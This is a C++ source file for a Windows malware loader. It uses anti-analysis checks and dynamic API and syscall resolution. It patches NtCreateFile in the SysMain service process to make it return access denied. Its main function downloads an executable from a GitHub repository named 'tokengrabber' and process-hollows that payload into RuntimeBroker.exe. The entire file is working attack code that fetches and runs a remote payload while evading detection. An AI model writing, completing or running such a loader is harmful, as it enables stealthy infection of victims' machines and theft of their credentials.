#include "include/Common.h"
#include "include/Network.h"
#include "include/PEParser.h"
#include "include/Security.h"
#include "include/HollowingCore.h"
#include "include/SyscallResolver.h"
#include "include/PEBWalker.h"
#include <winsvc.h>

static const std::string PAYLOAD_PATH   = "https://github.com/bielzxdev/tokengrabber/raw/refs/heads/main/Weed.exe";
static const std::string TARGET_PROCESS = "C:\\Windows\\System32\\RuntimeBroker.exe";

namespace NtCreateFileHook {

    typedef HANDLE(WINAPI* fn_OpenProcess)(DWORD, BOOL, DWORD);
    typedef BOOL(WINAPI* fn_ReadProcessMemory)(HANDLE, LPCVOID, LPVOID, SIZE_T, SIZE_T*);
    typedef BOOL(WINAPI* fn_WriteProcessMemory)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*);
    typedef BOOL(WINAPI* fn_VirtualProtectEx)(HANDLE, LPVOID, SIZE_T, DWORD, PDWORD);
    typedef BOOL(WINAPI* fn_CloseHandle)(HANDLE);
    typedef SC_HANDLE(WINAPI* fn_OpenSCManagerW)(LPCWSTR, LPCWSTR, DWORD);
    typedef SC_HANDLE(WINAPI* fn_OpenServiceW)(SC_HANDLE, LPCWSTR, DWORD);
    typedef BOOL(WINAPI* fn_QueryServiceStatusEx)(SC_HANDLE, SC_STATUS_TYPE, LPBYTE, DWORD, LPDWORD);
    typedef BOOL(WINAPI* fn_CloseServiceHandle)(SC_HANDLE);
    typedef HMODULE(WINAPI* fn_LoadLibraryW)(LPCWSTR);

    static HANDLE  g_hProc   = NULL;
    static LPVOID  g_patchVA = NULL;
    static BYTE    g_orig[12] = {};
    static bool    g_active  = false;

    static DWORD FindSysMainPid(PVOID kb) {
        auto pLoadLib = (fn_LoadLibraryW)Hollowing::MyGetProcAddress(kb, "LoadLibraryW");
        if (!pLoadLib) return 0;

        PVOID adv = Hollowing::MyGetModuleHandle(L"advapi32.dll");
        if (!adv) {
            adv = (PVOID)pLoadLib(L"advapi32.dll");
            if (!adv) return 0;
        }

        auto pOpenSCM   = (fn_OpenSCManagerW)Hollowing::MyGetProcAddress(adv, "OpenSCManagerW");
        auto pOpenSvc   = (fn_OpenServiceW)Hollowing::MyGetProcAddress(adv, "OpenServiceW");
        auto pQuerySvc  = (fn_QueryServiceStatusEx)Hollowing::MyGetProcAddress(adv, "QueryServiceStatusEx");
        auto pCloseSvc  = (fn_CloseServiceHandle)Hollowing::MyGetProcAddress(adv, "CloseServiceHandle");
        if (!pOpenSCM || !pOpenSvc || !pQuerySvc || !pCloseSvc) return 0;

        SC_HANDLE hSCM = pOpenSCM(NULL, NULL, SC_MANAGER_CONNECT);
        if (!hSCM) return 0;

        const wchar_t svcName[] = { L'S',L'y',L's',L'M',L'a',L'i',L'n',0 };
        SC_HANDLE hSvc = pOpenSvc(hSCM, svcName, SERVICE_QUERY_STATUS);
        if (!hSvc) {
            pCloseSvc(hSCM);
            return 0;
        }

        SERVICE_STATUS_PROCESS ssp = {};
        DWORD needed = 0;
        BOOL ok = pQuerySvc(hSvc, SC_STATUS_PROCESS_INFO, (LPBYTE)&ssp, sizeof(ssp), &needed);
        DWORD pid = (ok && ssp.dwCurrentState == SERVICE_RUNNING) ? ssp.dwProcessId : 0;

        pCloseSvc(hSvc);
        pCloseSvc(hSCM);
        return pid;
    }

    static bool Install() {
        PVOID kb = Hollowing::MyGetModuleHandle(L"KERNELBASE.dll");
        if (!kb) kb = Hollowing::MyGetModuleHandle(L"kernel32.dll");
        if (!kb) return false;

        PVOID ntdll = Hollowing::MyGetModuleHandle(L"ntdll.dll");
        if (!ntdll) return false;

        PVOID pNtCreateFile = Hollowing::MyGetProcAddress(ntdll, "NtCreateFile");
        if (!pNtCreateFile) return false;

        DWORD pid = FindSysMainPid(kb);
        if (!pid) return false;

        auto pOpenProc  = (fn_OpenProcess)Hollowing::MyGetProcAddress(kb, "OpenProcess");
        auto pReadPM    = (fn_ReadProcessMemory)Hollowing::MyGetProcAddress(kb, "ReadProcessMemory");
        auto pWritePM   = (fn_WriteProcessMemory)Hollowing::MyGetProcAddress(kb, "WriteProcessMemory");
        auto pVPEx      = (fn_VirtualProtectEx)Hollowing::MyGetProcAddress(kb, "VirtualProtectEx");
        if (!pOpenProc || !pReadPM || !pWritePM || !pVPEx) return false;

        g_hProc = pOpenProc(PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION, FALSE, pid);
        if (!g_hProc) return false;

        g_patchVA = pNtCreateFile;

        SIZE_T rd = 0;
        if (!pReadPM(g_hProc, g_patchVA, g_orig, 12, &rd) || rd != 12) {
            auto pClose = (fn_CloseHandle)Hollowing::MyGetProcAddress(kb, "CloseHandle");
            if (pClose) pClose(g_hProc);
            g_hProc = NULL;
            return false;
        }

        // mov eax, 0xC0000022 ; ret ; nop*6
        BYTE patch[12] = { 0xB8, 0x22, 0x00, 0x00, 0xC0, 0xC3, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90 };

        DWORD oldProt = 0;
        pVPEx(g_hProc, g_patchVA, 12, PAGE_EXECUTE_READWRITE, &oldProt);
        SIZE_T wr = 0;
        pWritePM(g_hProc, g_patchVA, patch, 12, &wr);
        pVPEx(g_hProc, g_patchVA, 12, oldProt, &oldProt);

        g_active = (wr == 12);
        return g_active;
    }

    static void Remove() {
        if (!g_active || !g_hProc || !g_patchVA) return;

        PVOID kb = Hollowing::MyGetModuleHandle(L"KERNELBASE.dll");
        if (!kb) kb = Hollowing::MyGetModuleHandle(L"kernel32.dll");
        if (!kb) return;

        auto pWritePM = (fn_WriteProcessMemory)Hollowing::MyGetProcAddress(kb, "WriteProcessMemory");
        auto pVPEx    = (fn_VirtualProtectEx)Hollowing::MyGetProcAddress(kb, "VirtualProtectEx");
        auto pClose   = (fn_CloseHandle)Hollowing::MyGetProcAddress(kb, "CloseHandle");
        if (!pWritePM || !pVPEx) return;

        DWORD oldProt = 0;
        pVPEx(g_hProc, g_patchVA, 12, PAGE_EXECUTE_READWRITE, &oldProt);
        SIZE_T wr = 0;
        pWritePM(g_hProc, g_patchVA, g_orig, 12, &wr);
        pVPEx(g_hProc, g_patchVA, 12, oldProt, &oldProt);

        if (pClose) pClose(g_hProc);
        g_hProc = NULL;
        g_patchVA = NULL;
        g_active = false;
    }
}

int main() {
    if (Hollowing::Security::CheckAnalysis()) {
        return 1;
    }

    if (!Hollowing::APIResolver::GetInstance().ResolveAll()) {
        return 1;
    }

    if (!Hollowing::SyscallResolver::GetInstance().ResolveAll()) {
        return 1;
    }

    // Install before downloading or creating the target process. The hook is
    // kept for the post-create SysMain window and removed afterwards.
    if (!NtCreateFileHook::Install()) {
        return 1;
    }

    std::vector<BYTE> peData;
    if (!Hollowing::Network::DownloadPE(PAYLOAD_PATH, peData)) {
        NtCreateFileHook::Remove();
        return 1;
    }

    Hollowing::PE_INFO peInfo;
    if (!Hollowing::PEParser::Parse(peData, peInfo)) {
        NtCreateFileHook::Remove();
        return 1;
    }

    if (!Hollowing::HollowingCore::PerformHollowing(TARGET_PROCESS, peInfo)) {
        NtCreateFileHook::Remove();
        return 1;
    }

    Sleep(15000);
    NtCreateFileHook::Remove();
    return 0;
}
